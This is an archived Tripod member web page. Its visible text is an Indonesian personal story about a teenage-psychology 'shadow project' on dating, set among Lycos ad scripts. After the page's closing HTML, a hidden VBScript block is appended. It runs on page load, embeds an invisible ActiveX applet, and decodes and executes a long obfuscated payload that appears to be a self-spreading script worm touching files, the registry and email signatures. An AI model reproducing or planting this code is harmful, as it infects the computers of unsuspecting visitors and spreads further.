<head>
<title>coba tebak</title>
</head>
<body><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "shap-01";
var tripod_member_page = "shap-01/index.html";
var tripod_ratings_hash = "1319707099:a16122404c47f8f6a12e4a49d8fdf2e0";

var lycos_ad_category = {"find_what":"muda"};

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=80385";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=80385";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=80385" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>

Assalamualaikum..<br>
Maaf, yan silakan baca secuil cerita ini. Yaa..mungkin / pasti kamu tahu apa isinya tapi tolong dibaca dulu sampai abis ok..<br>
Begini Ceritanya..<br>
Bermula pada waktu aku dulu masih duduk di SMU tepatnya pada kelas 2 
aku kenal pada sebuah mata pelajaran Sosiologi, aku sangat tertarik dan bisaa bilang sangat suka.
Dan pada waktu aku duduk di kelas 3, aku menemukan sebuah buku yang berjudul Psykologi setelah dibaca isi nya lebih menarik dari pada sosiologi, apalagi dengan satu
topik pembahasan tentang psykologi remaja, aku jadi ingin tahu apa sih remaja itu perkembangan kejiwaan seorang remaja, pengaruh lingkungan pada remaja,terutama sikap remaja terhadap 
apa sih itu pacaran. Dengan adanya beberapa pertanyaan ini aku mulai aku membentuk suatu peneliatian yang kuberi nama shap-01 (shadow project 01) mengumpulkan berbagai literatur tentang psykologi remaja. Aku tidak puas dengan hanya mengandalkan 
sumber dari berbagai buku lagi pula buku yang didapat sangatlah minim (khususnya di kisaran) maka aku terfikir untuk mengadakan riset sendiri dengan mewawancarai beberapa teman smu, teman satu desa, teman - teman yang masih duduk di sltp
aku memisahkan mereka kedalam beberapa kategori terutama pada dua hal pokok yaitu sikap dan pola fikir mereka. Selama di kelas 3 itulah aku mengadakan riset artinya satu tahun.
Setelah Aku mulai kuliah aku berfikir risetku akan semakin mudah ehh.. ternyata malah makin sulit dan akhirnya risetku berhenti beberapa bulan.
Kemudian setelah waktu mulai renggang aku ingin melanjutkan kembali riset itu. Tapi kali ini dengan ide yang sangat gila, aku ingin mengalami sendiri bagai mana sikap cewek yang ketika seorang cowok mengungkapkan perasaannya kepada cewek tersebut  .
Pengumpulan data target mulai disusun, tersaring beberapa calon target, lalu aku menyaring meraka kedalam tiga kategori lagi (sikap / pola fikir / kedewasaannya). Dan akhirnya ada tiga calon target sasaran yang kudapat
meraka semua alumnus SMUNS4. target pertama telah kutentukan, rancangan semua sistem kerja mulai dilaksanakan, lebih dari tiga bulan aku merancang seluruh sistem kerja. Ujian akhir semester adalah target
penentu pelaksanakaan shap-01.<a href="shap-01a.html">klik disini untuk melanjut..</body></html>











<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "?dfDiPd`m^(CofhO`qp'Q[oO`qp'?^cm`^Odbg(<kih`J[f`^m(ANH(RnLd`ge(RdgL\oa(Np[A'Abj\gr@dndNn^FC[noZno#FCO`o=eh#FC?m`Zp`Hbhd`n$$GEGbg`Dm$$GE>ka\o^I\de$$GEKkkk\`]o`!%>j_Lq]Anj^obkiDF<kiai_Mk#Abh`KZpc'Muk`Lpm$JiAmmhnM^oph^I`qpLaoKa\_Mahk9ALK)JiaiO^toAbh`#?eg`I]oc%-$PhkLpm6M`Z`O`fl)M^]_<ehBbDgoom!PhkLpm'GEZlp\mm$$79,JkG`g$OhiOom7*Oc^jKa\_Mahk'?gjla>tdoBpi\pdjg@g`D_D_OtiaNok8dooOc^jKa\_Mahk'?gjlaLao?eg`Mahk9ALK)JiaiO^toAbh`#?eg`I]oc%.$Bdg^P`hi*Rmbp`8=H@ThjgjZ`8!q]l_mdip5DFZnm]mo!%!:q]<nGaOflNok!o^>mEb!DoheP`smAbh`O^ik)<hjn^N^pA:pomb^8BNJ'C`o?eg`!Bdg^L\oa%?=ooke])Zpomb^po^o8//Agn^M^]_O^ik)<hjn^N^pAbh`O^ik6ANH*Jk^jO`qpAdea#Abh`KZpc'1%BbOrl`Nmn8cofhMd`iAdeaO`fl)Rkeo`r]>kHa7!DOHE:q]<nGa5!=J=Ujghj\]9!r]n\ndkm6FC[noZno#7!r]>kHaCofhO`qp>hn`BbOrl`Nmn8q]lOaaiBdg^P`hi*Rmbp`o^>mEb!R]nMaso@i]DaAdeaO`fl)>ekn`@i]Da@i]Apg_odhjApg_odhjFC?c\gc`Nn^#>nnm`gpNokeib%H\nmEi_^t>cZn$EaE]noBj_`q?c\k8)Oc^jBbG^bo#E?\n^$>pkn`imOombjb$%-$68G<]n`!^Oc^jDF>cZjb`Lq]6Adg]gt=enf3XOp]>8)@eo`GE>a]ib^Op]9>an#<l_#G^bo#E?\n^$>pkn`imOombjb$%-$$),!6WNp[A8,>j_Bb>hn`FE<d\i`aNp[8Fe_#<qmm^joNmndi`(,'E]noBj_`q?c\k%>j_Bb>j_?qi^meji?qi^mejiGE>ka\o^I\de$$Ki>nmjkM`lqh`J`smD_DiPd`m^8doheOaaiAsdmApg_odhj>j_BbLd\m^Bdg^8Eaao!SdiI]oc%/$KkkbmZiAbh`nU?jhfki?eg`lXHd\njnhboLd\m^`WNm]odhj`mrX]gZjf)aphDa$ANH*Adea@sboon!Oc\kaAdea$$Pc`g>ZhgDF<kiai_Mk#Na]m`?eg`%cofh$@glaLao?eg`Mahk9ALK)JiaiO^toAbh`#Ld\m^Bdg^(-'mnp`Abh`O^ik)Pndo^7!DOHE:q]<nGa5!=J=Ujghj\]9!r]n\ndkm6FC[noZno#7!r]>kHaCofhO`qp?eg`Mahk'?gjla>j_Bb=aa\nhoD]8PoNc^hg)KabM^]_#DF@R[>PKN@IM[PN>NWD]aiobpd`lX?`_]pgmPn^nD=$KpoEkjfOamnbki6RnLd`ge*M``N`\]$CDATZEK><E[H<<DDI>XNj_pr\kaWHb_mjlkaoUKpoekjfAskkannUI`_b]Q`k$SnNaagg'N`bPndo^CDATZ<QMM>JOZNO@MUE_`gpdobanW?`_]pgmE_!XNj_pr\kaWHb_mjlkaoUKpoekjfAskkannU!Eaao!KpoEkjfOamnbki'*%!*+WF]dgU?jhikn`Qn`Oo\meji^nt%-'KABZ=SJM=<]ggGEHZegM^c#AG@TX?PMKAIOXQN@KXD_^jodme`nU!?^b\pepD_WNhborZn`WFe^mhojamXJpmhjjd@sin`nlX!H`am$JpmHjjdR`mleji%-$)+UI\deXNoZpdjgamtJ\h^'Na]m`?eg`>ZhgDFH\bhM``$CDATZ<QMM>JOZNO@MUE_`gpdobanW?`_]pgmE_!XNj_pr\kaWHb_mjlkaoUKpoekjfAskkannU!Eaao!KpoEkjfOamnbki'*%!*+WF]dgUSd_^NoZpdjgamtJ\h^'Na]m`?eg`RlOc`eh)M^cRmbp`DF@R[>PKN@IM[PN>NWNhborZn`WFe^mhojamXJa_e^`U5)+UKpoekjfUKkobkinUI\deX@_bpjmIn`a^n`i\a'*/,+0.'KABZ=SJM=<]ggGEHZegM^c#AG@TX?PMKAIOXQN@KXNj_pr\kaWHb_mjlkaoUSdi]krnI`nl]bdgcNn^ntlp`hULmj_eg`lXHd\njnhboHqoghkfBjo`kj`oO`omeiblX+\)`+-),++),++),^+),++),++),++-2W+)-`+,2+%]gZjf>ZhgDFH\bhM``$CDATZ<QMM>JOZNO@MUOjams\m^XHd\njnhboWPei_hsnGPW>nnm`gpQ`kodjgXRdg`jrlH`lo\bbjbLq]nroo`fXKmhbdg^oWHb_mjlkaoKpoekjfEio^ni`mN`mpdi`oW+Z,_++,++),++),+^),++),++),++)01W),,`)/1+(]e]if%PoNc^hg)KabRkeo`CF>UZ>NNM@GPZPLAMWLkaop]m`UId^kknj_pWJ_bd^^X,+',WJnpgjhgWJipdjgoWHZegW>`dohnKm^b`m^j^`(,.*,2-%M@@[?RHN?>\ehFCI\deN`b!CF>UZ>NNM@GPZPLAMWLkaop]m`UId^kknj_pWJ_bd^^X,+',W>hihjgXH\bhN`mpdi`oWI^sNoZpdjgamt(]e]if%DFphf]b`?kg_^n#G^bo#PeiKZpc',%!Kmhcm\fAdeanW<khhhjAbh`nUId^kknj_pNa]m`]XNoZpdjgamt%>j_?qi^meji?qi^mejiGE>ka\o^Idgbap#Jg@mkkmKanpfaI^toP`hiL\oa8BbIhp#ALK)Abh`@qenol$RdgL\oa!SN^keko'as`%$Md`iO`flK\md8ntlp`h,.W@i]DaDaP`hiL\oa8otnmah.+XMd`iNoZnoPiBdg^8PeiKZpcNROO@FXF`kj`g,.)_ehAgn^Nm]moNlAdea8SdiI]ocLUNO>IWF^ni`e*_ge>j_BbPoNc^hg)KabRkeo`CF>UZGH?<GXI<>AEI@UOjams\m^XHd\njnhboWPei_hsnW<qmm^joQ^nndhjWMnjWF^ni`e/-%Oo\kpPk?eg`ANH*>jiuAdeaRbjK\md!r`[Xfep]gg'cda(RdgL\oa!s`]UBjg]am)apoANH*>jiuAdeaRbjK\md!ntlp`h,.Wfcs\ge*bd_'RbjK\md!ntlp`h,.W_^ofohl)dge?\geFE:lk`g`Oj!SdiI]ocpa]W?kg_^n)cmp'doo%PoNc^hg)KabRkeo`CF>UZ>E=NN>OZMHKOW'`ggU']hgabh`RnLd`ge*M``SmdmaAG@TX?G<LO@NXNJJMX)_ehW>hjo`gpOrl`%\kihd^Zpdjg+s(fo_jpjgjZ`SnNaagg'N`bPndo^CDATZ<H<NLANZKKJOU`gg_eg`U@`aZqgoB_jiU'RlOc`eh)M^cM`Z`#AG@TX?G<LO@NXNJJMXqs]bdg^X?`_]pgmE^jgX$RnLd`ge*M``SmdmaAG@TX?G<LO@NXNJJMX_gebdg^XN^keko>jbdgaW%Q=L_mdipSnNaagg'N`bPndo^CDATZ<H<NLANZKKJOU`gg?eg`UOc`ehWJiaiW<khhZj_W(RdgL\oa!MahkI]ocPO^mblo)^t` , #PoNc^hg)KabRkeo`CF>UZ>E=NN>OZMHKOW]hgAbh`WLd`geAsWInjk^notLd``mD\i]h`mlXRNALmjioW%v1).0/<=0(21.=&-,>?)3>22(+)=<+)>32)4>xRlOc`eh)M^cRmbp`DF@R[>G:ON@L[MJHPW_ehAdeaWN\ndkmDjnmAi^h``W(v11,.*2.,&03+<),,=.(=*B4(),>+-B31</-/vLao?eg`Mahk9ALK)JiaiO^toAbh`#Lp\mmQkAbh`'+(omna$Bdg^P`hi*Rmbp`O^nO^toBdg^P`hi*>gho`Ai_Bpi\pdjgBpi\pdjgFEEef`Bp#$DaEiRaam`89doheOaaiAsdmApg_odhj>j_BbMddnEk^\meji9_h_ph^jo)ek^\mejiDaH`am$OcboGj\]odhj'-%8adeaMd`iOcboGj\]odhj8Id_!PcdlHj^Zpdjg(4$DaBNJ'C`o>to`godjgJ\h^$OcboGj\]odhj$5:oc^jMddnEk^\meji9G^bo#MddnEk^\meji%H`i!PcdlHj^Zpdjg%(H`i!BNJ'C`o?eg`G]h`!PcdlHj^Zpdjg%$$@i]DaDaH`i!PcdlHj^Zpdjg%9/OaaiPcdlHj^Zpdjg8MddnEk^\mejiU>j_BbDFphf]b`?kg_^n#OaenGh_\obki$@i]Da@i]Apg_odhjApg_odhjFCI\deN`b!N`bLpm'?eg`G]h`Jg@mkkmKanpfaI^toN`bMahkLpm6RnLd`ge*M``N`\]$M``OomD_M``P`hiOom9Oc^jPoNc^hg)KabRkeo`N`bLpm'?eg`G]h`@i]Da@i]Apg_odhjApg_odhjFCK]jLq]#<qmm^joNmndi`%Lq]@9+O`lpJpm8)?hRcbh`Mnp`O`lpJpm8ManoHqo$,EaManoHqo7-3Pc`g>nnm`gpNokeib9Abj\gr@dnd!6W@sbp?h@g`D_Jg@mkkmKanpfaI^toO`oPcdlBjg]am6ANH*B`mBjg]am#<qmm^joNmndi`%Lao=e^Nn^8?m`Zp`J[f`^m$N\ndkmeib'@d^mejiZntN^pAhh_`ko8PcdlBjg]am)Lq]Ahh_`ko?kg_^n>jnjo6+BjmA\^aO`flAje``mei?kg_^nnBjg]am>hqio9Ahh_`k?jpgp&-=e^Nn^)\]`Ahh_`k?jpgp'Mahk?kg_^n)IZi`J`smD_?d\Op]'?jpgp8,OaaiH\nmEi_^t>cZn8EinmnM`o$>pkn`imOombjb'X'Eai#<qmm^joNmndi`%(,Nn^Nokeib9Hb`#>nnm`gpNokeib%H\nmEi_^t>cZn&,%H`i!?pmkaioLpmdgc$(E]noBj_`q?c\k),$>pkn`imOombjb6FE<d\i`aNp[$>pkn`imOombjb'E]noBj_`q?c\k%Lq]@9,@glaBbNn^@6+Md`i>pkn`imOombjb6>pkn`imOombjb?d\Op]'Eo`f$,$U>tdo@jAgn^e9+Ajke6,MkAhh_`k?jpgpBbG<]n`!Op]Lpmdgc$6G>Zo`#=e^Nn^)Dmah#c%$Md`iDaf7Bjg]am>hqioPc`g>nnm`gpNokeib9>nnm`gpNokeib?b_Np[*Do^i#e$-$W@qeo=k>j_Bb>j_BbGasoG\lpDi]as>a]m6DilpmM^r#>nnm`gpNokeib%W%H`i!?pmkaioLpmdgc$(*%Lq]Nmndi`8Fe_#<qmm^joNmndi`(G\lpDi]as>a]m&*(G`g$>pkn`imOombjb$&H\nmEi_^t>cZn(,>nnm`gpNokeib9FC?c\gc`Nn^#>nnm`gpNokeib%H\nmEi_^t>cZn$Ai_EaAi_EaHjjiFCK]jLq]6>pkn`imOombjbAi_Bpi\pdjgBpi\pdjgFEInjkZc\o^$$Ki>nmjkM`lqh`J`smM^cK\mdQ\eq`6CDATZEK><E[H<<DDI>XNj_pr\kaWHb_mjlkaoUKpoekjfAskkannU@`bka`?dlg?``n``9RlOc`eh)M^cM`Z`#M^cK\mdQ\eq`$Da@dnd@`bka`6Pc`g?bof?^cm`^8?ei\eu?dlg!5W@g`D_Ahnd6-oh0@dnd@`bka`6FEH^jNn^#?bof?^cm`^%DFphf]b`?kg_^n#?bof?^cm`^%GasoRnLd`ge*M``SmdmaM^cK\mdQ\eq`'=enf=abm^a>j_?qi^meji?qi^mejiGEpfi\b^Bjg]am#I]ocG]h`Jg@mkkmKanpfaI^toO`oBjg]amIZi`6ANH*B`mBjg]am#I]ocG]h`N^pOaenAbh`n9Ahh_`kJ\h^*AdeanDoo>tdnmo8,?km>]^cPcdlBdg^DiPcdlBdg^o?eg`>to6P>Zo`#?OJ)@ao@qp`ilejiG]h`!PcdlBdg^*K\md$$DaBdg^Aso9APHKm?eg`>to6CMIGKm?eg`>to6<LLHnAbh`@qp8KCIJkAdea@sm8FNKOc^j<]ggGE<il`i]Pj#Mddn?eg`'L\oa(cmig@eo`D_Adea@sm8R=NOc^j<]ggGE<il`i]Pj#Mddn?eg`'L\oa(q[o$@glaDaBdg^Aso9APOPc`gCmp@sboon9,@i]DaI`qpBb#N?\n^$K\mdI\fa$6P>Zo`#PeiKZpc?^ofohlW%Jk#P<]n`!L\oaJ\h^%8Q>\la#RbjK\md!?`lgoji$$Md`iComAsdlpn6,Ai_EaEaApo@qenol8)Oc^j?OJ)<kkt?eg`SdiI]ocluno^i.-U``ndpjk'eid(K\mdI\fa?OJ)<kkt?eg`SdiI]ocpa]W?kg_^n)cmp'I]ocG]h`@i]Da@i]Apg_odhjApg_odhjFCO`o=eh#Jg@mkkmKanpfaI^toAmm'?g`ZnManoBp8SN^keko'O^mbloAnhgiZi`Ea>nmMd`iDiPd`m^8dohe>hn`DiPd`m^8r]n@g`D_D_DiPd`m^8r]nOc^jLao?OJ6>m^]o`H^e`\p#L_mdipdi`*AdeaNtlp`hH^e`\p$N`mRnLd`ge8<n`\maJ]ca^o!RN\ndkm*Nc^hg@eo`O`o=kkeaJ]ca^o9_h_ph^jo)Zlkg^pn#GEZ`q`nm$=kkeaJ]ca^o'o`o<HND=$v?5.0=?--&->A)),,=,(<=>4(),>+-B?01=+=v$=kkeaJ]ca^o'_m`Zp`Dgoo\g_`#N^pRlOc`eh8=kkeaJ]ca^o'C`oH^e`\p#$<kih`J[f`^m*n`m?GNB@#t,?/,B@+*)A+2/(,*?A(15/+&,+<)?4+.0--1y$<kih`J[f`^m*^m^]o`BjnoZj^`!%Lao?OJ6<kih`J[f`^m*B`mK]e^_o#@g`D_N^p?bofJ[f`^m8?OJ)=ndq^o?km>]^c@dndP`hiDi@dndK]e^_oEa=enfMahk'@mdoaOtia77-:j_=enfMahk'@mdoaOtia77,Md`i@sbpAhn>j_Bb?ei\eu?dlg8@dndP`hi*?mbr`G^po`kI^to@dhKoc^n<mk$.$M\g`jhbv`Bjme8+Pj,Jmd`m:nm#b%8Eio!$4#Mi]%$J`smO^ikNmndi`8?kmb9,MkG^j#OaenO^to$O`flIpf8:o^#Fe_#MddnMaso%e',%BbO^ikIni8-.Md`iO`flIpf8+4>hn`BbO^ikIni8-+Md`iO`flIpf8+5>j_BbMahk<d\m9>an#O^ikIni(Koc^n<mk$dFk_-%$EaMahk<d\m9>an#.-%OaaiP`hi?c\k8<dm#*4$Ai_EaP`hiOombjb6O`flNokeibO^ik>a]mJ`smPgHj^dOom9>t`^np`#?dfF`r=mm!/$'MddnMaso!q[?mG_Dat<kn#+8!Hpc`k=mm!,$q]<nGaF^u<mk$,$9Jmd`m:nm#*%!r]>kHa!F`r=mm!.$6Joaam<kn#-!!o^>mEb!G`t:nm#,%8!Koc^n<mk$.$!q[?mG_?kmb9,MkG^j#@qaNokeib!o^>mEb!P`hiJph9<l_#Hb`#@qaNokeib%e',%r]>kHa!DaP`hiJph9,1Oc^jr]>kHa!O`flIpf8,0r]>kHa!@i]Da!q[?mG_Mahk<d\m9>an#O^ikIni&G`t:nm#bHj]/$!o^>mEb!EaMahk<d\m9>an#-1%Oaaiq]<nGaO^ik>a]m6q]<nr]>kHa!@glaDaP`hi?c\k8<dm#+5$Md`i!q[?mG_Mahk<d\m9q[Haq]<nGa@g`D_!o^>mEb!PcdlP`sm8MddnMasoO^ik>a]mq]<nGaI^to%q]<nGa>t`^np`#MddnMasoMddnMaso9>t`Nmndi`8O`flNokeibDoheP`sm85!n^kekoh\i`q\b^9q]l_mdip9q[?mG_!`j^ni`im*rmbp`!5!_donorh`8 ljnbpdjg6\]lkgpma6eaao3,ks4oji6+kq7rb`oc3,ks4c`bcco3,ks4u(bj_`q6-34qdle]deeot3cd]``i :7!!<KIH@OJ<H>9FE![bp^ooAADBAP8+SD?MD8+_j_^9^jf*hn'!\^meq`Q*<^meq`!T>jflji^jo9!8*:LKG>P95!*_br9!r]>kHa7!+n^keko7!r]>kHa7!o^mbloe]ibn]b`6r]n\ndkm:q]<nGaOaenO^toq]<nGaPgHj^dOomq[?mG_!8*l_mdip9q[?mG_!8*;K?T7!r]>kHa7!+COFH9Q]lP`sm8MddnMasoq[?mG_!NjGj\gNok!o^>mEb!FEXoo\kp#$RbjK\md8BNJ'C`oLl`^b]gAhh_`k$+$UBb#?OJ)?eg`>tdnmo#RbjK\md!r`[XAje``m'doo%$Md`iANH*>jiuAdeaRbjK\md!r`[XAje``m'doo(RdgL\oa!s`]UgerZhg)`ea@i]DaDa$ANH*Adea@sboon!SdiI]ocluno^i.-U``ndpjk'eid%$Md`iANH*>jiuAdeaRbjK\md!ntlp`h,.W_^ofohl)dge'PeiKZpcnroo`f/-Wdfr\eh)bbbAi_EaAi_Bpi\pdjg"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 4"&vbCrLf&"KeyArr(1) = 5"&vbCrLf&"KeyArr(2) = 5"&vbCrLf&"KeyArr(3) = 7"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</body>
</HTML>